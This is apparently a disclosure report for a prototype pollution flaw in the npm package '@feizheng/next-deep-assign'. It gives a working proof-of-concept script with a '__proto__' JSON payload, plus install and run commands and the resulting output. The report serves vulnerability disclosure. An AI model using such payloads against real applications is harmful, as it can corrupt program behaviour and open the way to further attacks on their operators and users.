# Description

`@feizheng/next-deep-assign` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var nextDeepAssign = require("@feizheng/next-deep-assign")
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
var obj = {}
console.log("Before : " + {}.polluted);
nextDeepAssign(obj, payload);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i @feizheng/next-deep-assign # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
